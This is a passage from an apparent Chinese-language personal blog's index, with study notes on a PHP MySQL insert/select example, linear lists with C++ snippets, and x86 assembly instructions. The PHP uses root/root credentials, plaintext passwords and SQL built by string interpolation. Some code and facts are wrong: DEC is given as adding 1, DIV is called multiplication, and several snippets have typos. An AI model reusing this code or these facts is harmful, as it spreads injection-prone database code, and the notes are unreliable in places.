class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 插入数据到数据库中, 数据库操作语句都是使用mysql_query</span></span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>); <span class="comment">// 连接到数据库: url, username, password</span></span><br><span class="line">mysql_select_db(<span class="string">"qt"</span>); <span class="comment">// 选择使用数据库中的表</span></span><br><span class="line"></span><br><span class="line">$result = mysql_query(<span class="string">"SELECT username, password FROM user"</span>);</span><br><span class="line"><span class="keyword">while</span> ($row = mysql_fetch_array($result)) &#123; <span class="comment">// 每使用一次后，会自动移向下一个游标</span></span><br><span class="line">    <span class="comment">// username 和 password 是数据库中列名</span></span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">"username"</span>], <span class="string">", "</span>, $row[<span class="string">"password"</span>], <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = <span class="string">"Blabla"</span>;</span><br><span class="line">$password = date(<span class="string">"H:i:s"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line">mysql_query(<span class="string">"INSERT INTO USER (username, password) VALUES ('$username', '$password')"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close MySQL connection</span></span><br><span class="line">mysql_close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构--线性表</title>
      <link href="/2020/06/29/xianxingbiao1/"/>
      <url>/2020/06/29/xianxingbiao1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>数据结构之线性表</p></blockquote><a id="more"></a> <h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>线性表</strong>是数据结构中最简单的数据存储结构，可以理解为“线性的表”。</p><p>线性，是说数据在逻辑结构上具有线性关系。将具有线性关系的数据存储到计算机中所使用的存储结构称为线性表。</p><ul><li>首先是一个序列</li><li>其次是有限的</li><li>存储的数据本身的类型一定保持相同。</li><li>线性表的开始元素没有前驱元素只有后继元素，线性表的结束元素没有后继元素只有前驱元素，除了开头元素和结尾元素以外，每个元素都有且只有一个前驱元素和后继元素。</li><li>数据一旦用线性表存储，各个数据元素之间的相对位置就固定了。</li></ul><hr><h2 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h2><p>线性表的存储结构有顺序存储结构和链式存储结构两种，前者称为顺序表，后者称为链表。</p><hr><h3 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h3><p>顺序表就是把线性表中的所有元素按照某种逻辑顺序，依次存储到从指定位置开始的一块连续的存储空间，重点是<strong>连续的存储空间</strong>。</p><p>数组长度和线性表的长度区别：数组长度是存放线性表的存储空间的长度，存储分配后这个量一般是不变的，线性表的长度是线性表中数据元素的个数，随着线性表插入和删除操作的进行，这个量是变化的。</p><ul><li>在顺序表中，各个表项的逻辑顺序与其存放的物理顺序一致，即第i个表项存储于第i个物理位置（1&lt;i≤n）。</li><li>对顺序表中所有表项，既可以进行顺序访问，也可以进行随机访问。也就是说，既可以从表的第一个表项开始逐个访问表项，也可以按照表项的序号（亦称为下标）直接访问表项。</li></ul><h4 id="顺序表的静态存储表示："><a href="#顺序表的静态存储表示：" class="headerlink" title="顺序表的静态存储表示："></a>顺序表的静态存储表示：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxSize 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> T;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">T data[maxSize];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">&#125;SeqList;</span><br></pre></td></tr></table></figure><h4 id="顺序表的动态存储表示："><a href="#顺序表的动态存储表示：" class="headerlink" title="顺序表的动态存储表示："></a>顺序表的动态存储表示：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> T;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">T* data;</span><br><span class="line"><span class="keyword">int</span> maxSize，n;</span><br><span class="line">&#125;SeqList;</span><br></pre></td></tr></table></figure><h4 id="顺序表搜索算法："><a href="#顺序表搜索算法：" class="headerlink" title="顺序表搜索算法："></a>顺序表搜索算法：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">Seqlist</span>&lt;T&gt;:</span>:search(T&amp; x)&#123;</span><br><span class="line"><span class="comment">//搜索函数，在表中找到x，找到则返回元素位置，否则返回0</span></span><br><span class="line"><span class="comment">//last表示最后一个元素的数组标号，从0开始，表项是从1开始</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=last;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(data[i]==x) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="顺序表插入算法："><a href="#顺序表插入算法：" class="headerlink" title="顺序表插入算法："></a>顺序表插入算法：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">Seqlist</span>&lt;T&gt;:</span>:insert(<span class="keyword">int</span> i,T&amp; x)&#123;</span><br><span class="line"><span class="comment">//将新元素插入到表第i个元素之后，函数返回true，否则返回false</span></span><br><span class="line">    <span class="keyword">if</span>(last==maxsize<span class="number">-1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>||i&gt;last+<span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=last;j&gt;=i;j--)&#123;</span><br><span class="line">        data[j+<span class="number">1</span>]=data[j];</span><br><span class="line">    &#125;</span><br><span class="line">    data[i]=x;</span><br><span class="line">last++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="顺序表删除算法："><a href="#顺序表删除算法：" class="headerlink" title="顺序表删除算法："></a>顺序表删除算法：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">Seqlist</span>&lt;T&gt;:</span>:<span class="built_in">remove</span>(<span class="keyword">int</span> i,T&amp; x)&#123;</span><br><span class="line"><span class="comment">//删除第i个表项，通过x返回删除的元素值，成功返回true</span></span><br><span class="line">    <span class="keyword">if</span>(last==<span class="number">-1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;last+<span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x=data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=last;j++)&#123;</span><br><span class="line">        data[j<span class="number">-1</span>]=data[j];</span><br><span class="line">    &#125;</span><br><span class="line">    last--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h3><p>链表，别名链式存储结构或单链表，用于存储逻辑关系为 “一对一” 的数据。与顺序表不同，链表不限制数据的物理存储状态，换句话说，使用链表存储的数据元素，其物理存储位置是随机的。线性表的链式存储结构的特点是用一组任意的存储单元存储线性表的数据元素，这组存储单元可以是连续的，也可以是不连续的，这就意味着这些数据元素可以存在内存未被占用的任意位置。还有一点就是在顺序存储结构中，每个数据空间只需要存储数据元素的信息即可，但是在链式结构中，除了要存储数据元素信息外，还需要存储他的后继元素的存储位置。我们把存储数据元素信息的域称为数据域，把存储直接后继位置的域称为指针域，指针域中存储的信息称为指针或链，数据域和指针域组成数据元素的存储映像，称为结点。</p><hr><h4 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h4><h5 id="单链表的定义"><a href="#单链表的定义" class="headerlink" title="单链表的定义"></a>单链表的定义</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linknode</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line">linknode* link;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">list</span>&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    linknode* first;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="单链表的查找算法"><a href="#单链表的查找算法" class="headerlink" title="单链表的查找算法"></a>单链表的查找算法</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">linknode</span>&lt;T&gt;* <span class="title">list</span>&lt;T&gt;:</span>:search(T X)&#123;</span><br><span class="line">    <span class="comment">//成功的时候返回地址，否则返回null</span></span><br><span class="line">    linknode&lt;T&gt;* current = first-&gt;link;<span class="comment">//带附加头结点</span></span><br><span class="line">    <span class="keyword">while</span>(current!=null)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;data==x)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> current=current-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的插入算法"><a href="#单链表的插入算法" class="headerlink" title="单链表的插入算法"></a>单链表的插入算法</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">list</span>&lt;T&gt;:</span>:inscrt(<span class="keyword">int</span> i,T&amp; X)&#123;</span><br><span class="line">    <span class="comment">//将新元素插入i结点之后</span></span><br><span class="line">    linknode&lt;T&gt; *current = locate(i);<span class="comment">//return i address</span></span><br><span class="line">    <span class="keyword">if</span>(current==null)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    linknode&lt;T&gt; *newnode = <span class="keyword">new</span> linknode&lt;T&gt;(x);</span><br><span class="line">    <span class="keyword">if</span>(newnode==null)&#123;<span class="built_in">cerr</span>&lt;&lt;<span class="string">"error"</span>&lt;&lt;<span class="built_in">endl</span>;<span class="built_in">exit</span>(<span class="number">1</span>)&#125;</span><br><span class="line">    newnnode-&gt;link=current-&gt;link;</span><br><span class="line">    current-&gt;link=newnode;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的删除算法"><a href="#单链表的删除算法" class="headerlink" title="单链表的删除算法"></a>单链表的删除算法</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">list</span>&lt;T&gt;:</span>:<span class="built_in">remove</span>(<span class="keyword">int</span> i,T&amp; X)&#123;</span><br><span class="line">    <span class="comment">//将第i个元素删除，x返回被删除的值</span></span><br><span class="line">    linknode&lt;T&gt; *current = locate(i<span class="number">-1</span>);<span class="comment">//return i-1 address</span></span><br><span class="line">    <span class="keyword">if</span>(current==null||current-&gt;link==null)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    linknode&lt;T&gt; *del = current-&gt;link;</span><br><span class="line">    x=del-&gt;data;</span><br><span class="line">    current-&gt;link=del-&gt;link;</span><br><span class="line">    <span class="keyword">delete</span> del;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>循环链表（circular list）是另一种形式的表示线性表的链表，它的结点结构与单链表相同，与单链表不同的是链表中表尾结点的link域中不是NULL，而是存放了一个指向链表开始结点的指针。这样，只要知道表中任何一个结点的地址，就能遍历表中其他任一结点。</p><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><p>双向链表又称为双链表。使用双向链表（doubly linked list）的目的是为了解决在链表中访问直接前驱和直接后继的问题。因为在双向链表中每个结点都有两个链指针，一个指向结点的直接前驱，一个指向结点的直接后继，这样不论是向前驱方向搜索还是向后继方向搜索，其时间开销都只有O(1)。</p><h4 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h4><p>如果为数组中每一个元素附加一个链接指针，就形成静态链表结构。它允许我们不改变各元素的物理位置，只要重新链接就能够改变这些元素的逻辑顺序。由于它是利用数组定义的，在整个运算过程中存储空间的大小不会变化，因此称之为静态链表。<br>静态链表的每个结点由两个数据成员构成：data域存储数据，link域存放链接指针。所有结点形成一个结点数组。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用汇编指令整理</title>
      <link href="/2020/06/25/huibian/"/>
      <url>/2020/06/25/huibian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一些常用汇编指令的整理。</p></blockquote><a id="more"></a> <h2 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h2><h3 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h3><h4 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h4><ul><li>格式：<code>MOV dst,src</code></li><li>功能：将<code>src</code>传送到<code>dst</code></li><li>限制：段寄存器间不可直接相互传送，立即数不能直接送段寄存器，CS 不可作为目的操作数。</li></ul><h4 id="PUSH-amp-POP"><a href="#PUSH-amp-POP" class="headerlink" title="PUSH &amp; POP"></a>PUSH &amp; POP</h4><ul><li>格式：<code>PUSH src</code> &amp; <code>POP dst</code></li><li>功能：将 <code>src</code> 压栈 &amp; 出栈送入 <code>dst</code></li><li>限制：CS 不可作目的操作数</li></ul><h4 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h4><ul><li>格式：<code>XCHG dst,src</code></li><li>含义：交换两个操作数内容（Exchange）</li><li>限制：段寄存器不可为操作数，也不能同时为存储单元，两个操作数也不能同时为内存变量。</li></ul><h4 id="XLAT"><a href="#XLAT" class="headerlink" title="XLAT"></a>XLAT</h4><ul><li>格式：<code>XLAT</code></li><li>含义：转换表（Table Look-up Translation）</li><li>功能：把待查表格（表格位于 DS:BX）的一个字节内容送到AL累加器中。在执行该指令前，应将TABLE首地址送至BX寄存器中，然后将待查字节与其在表格中距表首地址位移量送AL,即AL&lt;–((BX)+(AL)). </li></ul><hr><h3 id="地址目标传送指令"><a href="#地址目标传送指令" class="headerlink" title="地址目标传送指令"></a>地址目标传送指令</h3><h4 id="LEA"><a href="#LEA" class="headerlink" title="LEA"></a>LEA</h4><ul><li>格式：<code>LEA dst,src</code></li><li>含义：把地址偏移量传送目的操作数（Load Effective Address）</li><li>功能：取<code>src</code>地址偏移量送<code>dst</code></li><li>注：源操作数必须是存储单元，目的操作数必须是除段寄存器之外的 16 位寄存器。</li></ul><h4 id="LDS-amp-LES"><a href="#LDS-amp-LES" class="headerlink" title="LDS &amp; LES"></a>LDS &amp; LES</h4><ul><li>格式：<code>LDS dst,src</code> &amp; <code>LES dst,src</code></li><li>含义：取双字指针送到目的寄存器和 DS/ES</li><li>功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。</li></ul><hr><h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><h4 id="PUSHF-amp-POPF"><a href="#PUSHF-amp-POPF" class="headerlink" title="PUSHF &amp; POPF"></a>PUSHF &amp; POPF</h4><ul><li>格式：<code>PUSHF</code> &amp; <code>POPF</code></li><li>含义：将标志寄存器压栈/出栈</li><li>功能：PUSHF：执行操作: SP=SP-1,(SP)=PSW的高8位, SP=SP-1, (SP)=PSW的低8位，POPF相反。</li></ul><h4 id="LAHF-amp-SAHF"><a href="#LAHF-amp-SAHF" class="headerlink" title="LAHF &amp; SAHF"></a>LAHF &amp; SAHF</h4><ul><li>格式：<code>LAHF</code> &amp; <code>SAHF</code></li><li>含义：Load(Store) AH from(into) Flags</li><li>功能：将标志寄存器低字节送到 AH &amp; 将 AH 送到标志寄存器低字节</li></ul><hr><h3 id="输入输出指令"><a href="#输入输出指令" class="headerlink" title="输入输出指令"></a>输入输出指令</h3><h4 id="IN-amp-OUT"><a href="#IN-amp-OUT" class="headerlink" title="IN &amp; OUT"></a>IN &amp; OUT</h4><ul><li>格式：<code>IN AL/AX, ADDR</code> &amp; <code>OUT ADDR, AL/AX</code></li><li>功能：从端口地址（寄存器）获取数据送到寄存器（端口地址）</li><li>地址格式：端口地址有两种格式，小于 FFH 时可以是直接写出，否则必须先送入 DX 再使用。</li></ul><hr><h2 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h2><h3 id="加减法指令"><a href="#加减法指令" class="headerlink" title="加减法指令"></a>加减法指令</h3><h4 id="ADD-amp-ADC"><a href="#ADD-amp-ADC" class="headerlink" title="ADD &amp; ADC"></a>ADD &amp; ADC</h4><ul><li>格式：<code>ADD dst,src</code> &amp; <code>ADC dst,src</code></li><li>含义：（带进位）加法</li><li>功能：dst = src + dst (+ CF)</li></ul><h4 id="INC"><a href="#INC" class="headerlink" title="INC"></a>INC</h4><ul><li>格式：<code>INC dst</code></li><li>功能：自增 1，dst = dst + 1</li></ul><h4 id="SUB-amp-SBB"><a href="#SUB-amp-SBB" class="headerlink" title="SUB &amp; SBB:"></a>SUB &amp; SBB:</h4><ul><li>格式：<code>SUB dst,src</code> &amp; <code>SBB dst,src</code></li><li>含义：（带借位）减法</li><li>功能：dst = dst - src (- CF)</li></ul><h4 id="DEC"><a href="#DEC" class="headerlink" title="DEC:"></a>DEC:</h4><ul><li>格式：<code>DEC dst</code></li><li>功能：自减 1，dst = dst + 1</li></ul><h4 id="NEG"><a href="#NEG" class="headerlink" title="NEG:"></a>NEG:</h4><ul><li>格式：<code>NEG dst</code></li><li>功能：对目的操作数取负，dst = -dst</li></ul><hr><h3 id="乘除法指令"><a href="#乘除法指令" class="headerlink" title="乘除法指令"></a>乘除法指令</h3><h4 id="MUL-amp-IMUL"><a href="#MUL-amp-IMUL" class="headerlink" title="MUL &amp; IMUL"></a>MUL &amp; IMUL</h4><ul><li>格式：<code>IMUL src</code> &amp; <code>MUL src</code></li><li>含义：无符号数/整数乘法</li><li>功能：只有一个源操作数，当其为 8 位时，AX = AL * src，为 16 位时，（DX,AX）= AX * src</li></ul><h4 id="DIV-amp-IDIV"><a href="#DIV-amp-IDIV" class="headerlink" title="DIV &amp; IDIV"></a>DIV &amp; IDIV</h4><ul><li>格式：<code>IDIV src</code> &amp; <code>DIV src</code></li><li>含义：无符号数/整数乘法</li><li>功能：只有一个源操作数作为除数，当其为 8 位时，AX 为被除数，AL 作为商，AH 作为余数。当 src 为 16 位时，（DX,AX）作为被除数，AX 作为商，DX 作为余数。</li></ul><hr><h2 id="逻辑运算与移位指令"><a href="#逻辑运算与移位指令" class="headerlink" title="逻辑运算与移位指令"></a>逻辑运算与移位指令</h2><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><table><thead><tr><th align="center">指令</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>NOT dst</code></td><td align="center">取反，逻辑非</td></tr><tr><td align="center"><code>AND dst,src</code></td><td align="center">逻辑与</td></tr><tr><td align="center"><code>OR dst,src</code></td><td align="center">逻辑或</td></tr><tr><td align="center"><code>XOR dst,src</code></td><td align="center">异或</td></tr></tbody></table><h3 id="算术逻辑移位"><a href="#算术逻辑移位" class="headerlink" title="算术逻辑移位"></a>算术逻辑移位</h3><table><thead><tr><th align="center">指令</th><th align="center">含义</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>SAL dst,cnt</code></td><td align="center">Shift Arithmetic Left</td><td align="center">算术左移 cnt 位</td></tr><tr><td align="center"><code>SAR dst,cnt</code></td><td align="center">Shift Arithmetic Right</td><td align="center">算术右移 cnt 位</td></tr><tr><td align="center"><code>SHL dst,cnt</code></td><td align="center">Shift Logic Left</td><td align="center">逻辑左移 cnt 位</td></tr><tr><td align="center"><code>SHR dst,cnt</code></td><td align="center">Shift Logic Right</td><td align="center">逻辑右移 cnt 位</td></tr></tbody></table><p>cnt 为 1 或者 CL。算术右移时补最高位，逻辑右移补 0，被移出的移入 CF。</p><h3 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h3><table><thead><tr><th align="center">指令</th><th align="center">含义</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>ROL dst,cnt</code></td><td align="center">Rotate Left</td><td align="center">循环左移 cnt 位</td></tr><tr><td align="center"><code>ROR dst,cnt</code></td><td align="center">Rotate Right</td><td align="center">循环右移 cnt 位</td></tr><tr><td align="center"><code>RCL dst,cnt</code></td><td align="center">Rotate through Carry Left</td><td align="center">带进位左移 cnt 位</td></tr><tr><td align="center"><code>RCR dst,cnt</code></td><td align="center">Rotate through Carry Right</td><td align="center">带进位右移 cnt 位</td></tr></tbody></table><hr><h2 id="字符串操作指令"><a href="#字符串操作指令" class="headerlink" title="字符串操作指令"></a>字符串操作指令</h2><table><thead><tr><th align="center">指令（字节/字）</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>MOVSB / MOVSW</code></td><td align="center">字符串传送</td></tr><tr><td align="center"><code>CMPSB / CMPSW</code></td><td align="center">字符串比较</td></tr><tr><td align="center"><code>SCASB / SCASW</code></td><td align="center">字符串扫描</td></tr><tr><td align="center"><code>LODSB / LODSW</code></td><td align="center">字符串装入</td></tr><tr><td align="center"><code>STOSB / STOSW</code></td><td align="center">字符串存储</td></tr></tbody></table><p>对于后三条指令，操作使用 AL/AX 寄存器（根据操作数类型决定）。</p><ul><li>源串起始地址为 DS:SI，目的串位于 ES:DI</li><li>每一次操作都会自动修改 SI 和 DI</li><li>DF 标志位可以控制字符串处理方向，DF = 0 递增，DF = 1 递减，可通过 <code>CLD/STD</code> 设置</li><li>处理字符串长度放在 CX 中</li></ul><p>这些指令前可以用重复前缀 <code>REP</code> 反复执行，或是 <code>REPE/REPZ</code> 相等/为零则重复，<code>REPNE/REPNZ</code> 不相等/非零则重复。</p><hr><h2 id="处理器控制指令"><a href="#处理器控制指令" class="headerlink" title="处理器控制指令"></a>处理器控制指令</h2><h3 id="标志处理指令"><a href="#标志处理指令" class="headerlink" title="标志处理指令"></a>标志处理指令</h3><table><thead><tr><th align="center">指令</th><th align="center">含义</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>CLC</code></td><td align="center">Clear Carry</td><td align="center">CF = 0</td></tr><tr><td align="center"><code>CMC</code></td><td align="center">Complement Carry</td><td align="center">CF = NOT CF</td></tr><tr><td align="center"><code>STC</code></td><td align="center">Set Carry</td><td align="center">CF = 1</td></tr><tr><td align="center"><code>CLD</code></td><td align="center">Clear Direction</td><td align="center">DF = 0</td></tr><tr><td align="center"><code>STD</code></td><td align="center">Set Direction</td><td align="center">DF = 1</td></tr><tr><td align="center"><code>CLI</code></td><td align="center">Clear Interrupt</td><td align="center">IF = 0</td></tr><tr><td align="center"><code>STI</code></td><td align="center">Set Interrupt</td><td align="center">IF = 1</td></tr></tbody></table><hr><h3 id="外部同步指令"><a href="#外部同步指令" class="headerlink" title="外部同步指令"></a>外部同步指令</h3><h4 id="ESC"><a href="#ESC" class="headerlink" title="ESC"></a>ESC</h4><ul><li>格式：<code>ESC 外部操作码，src</code></li><li>功能：用来实现对 8087 协处理器控制。</li></ul><h4 id="WAIT"><a href="#WAIT" class="headerlink" title="WAIT"></a>WAIT</h4><ul><li>格式：<code>WAIT</code></li><li>功能：往往跟在 <code>ESC</code> 后等待，直到 <code>TEST</code> 为低电平。</li></ul><h4 id="LOCK"><a href="#LOCK" class="headerlink" title="LOCK"></a>LOCK</h4><ul><li>格式：<code>LOCK</code></li><li>功能：封锁总线，禁止其他处理器使用总线。</li></ul><hr><h3 id="停机和空操作"><a href="#停机和空操作" class="headerlink" title="停机和空操作"></a>停机和空操作</h3><h4 id="HLT"><a href="#HLT" class="headerlink" title="HLT"></a>HLT</h4><ul><li>格式：<code>HLT</code></li><li>功能：进入暂停状态不进行任何操作，直到复位或 NMI 引脚/INTR 引脚出现中断请求信号。</li></ul><h4 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h4><ul><li>格式：<code>NOP</code></li><li>功能：耗费三个时钟周期但不进行任何操作。</li></ul><hr><h2 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h2><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h4><ul><li>格式：<code>CMP dst,src</code></li><li>功能：用 dst 减去 src，但结果仅反映到标志位，不送回目的操作数。</li><li>常见用法：后跟<code>JZ</code>（相等跳转） &amp; <code>JNZ</code> （不相等跳转）。</li></ul><h4 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h4><ul><li>格式：<code>TEST dst,src</code></li><li>功能：对两个操作数作逻辑与，结果仅反映到标志位，不送回目的操作数。</li><li>常见用法：测试某一位，为 1<code>JNZ</code>跳转，为 0 <code>JZ</code>跳转。</li></ul><hr><h3 id="无条件转移"><a href="#无条件转移" class="headerlink" title="无条件转移"></a>无条件转移</h3><h4 id="JMP"><a href="#JMP" class="headerlink" 